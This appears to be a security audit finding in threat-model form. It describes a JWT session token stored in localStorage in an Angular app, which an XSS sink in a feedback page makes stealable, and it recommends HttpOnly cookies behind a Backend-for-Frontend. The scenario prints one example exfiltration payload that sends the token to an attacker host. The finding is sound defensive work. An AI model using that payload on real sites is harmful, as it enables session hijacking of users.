  stride: Information Disclosure
  cwe: CWE-922
  title: JWT Session Token Stored in localStorage — request.interceptor.ts:13
  affected_parameter: localStorage['token']
  scenario: The JWT session token is stored in localStorage (confirmed at request.interceptor.ts:13 and app.guard.ts:18, 35).
    localStorage is accessible to any JavaScript running in the same origin, including XSS payloads. Combined with the bypassSecurityTrustHtml()
    sink at about.component.ts:119, an attacker who stores a feedback comment containing fetch('https://attacker.com/?t='+localStorage.getItem('token'))
    will steal the session JWT of every About page visitor. The attacker can then replay this JWT in direct API calls to authenticate
    as the victim user, with no session expiry or binding controls evident at the SPA layer.
  evidence_summary: localStorage.getItem('token') at request.interceptor.ts:13 and app.guard.ts:18/35 confirms the JWT is
    stored in JavaScript-accessible storage, not an HttpOnly cookie; bypassSecurityTrustHtml() at about.component.ts:119 provides
    the XSS injection point completing the attack chain.
  impact_description: 'Complete session takeover: attacker obtains a valid JWT for the victim''s account, enabling authenticated
    API access without the victim''s knowledge.'
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None — token is directly accessible via localStorage.getItem('token') from any JavaScript context in
    the origin.
  mitigation_title: Move JWT session token from localStorage to HttpOnly Secure SameSite=Strict cookie managed by a Backend-for-Frontend
  remediation:
    effort: High
    steps:
    - Implement a Backend-for-Frontend (BFF) proxy that holds the JWT in an HttpOnly Secure SameSite=Strict cookie instead
      of returning it to the SPA for localStorage storage. The SPA never touches the raw JWT.
    - Remove all localStorage.setItem('token', ...) call sites and replace SPA-side auth state with a lightweight session
      indicator (non-sensitive boolean or display name) returned by the BFF.
    - 'As an interim measure while the BFF is implemented: eliminate all XSS injection points (bypassSecurityTrustHtml, [innerHTML]
      bindings) to reduce the attack surface for token theft.'
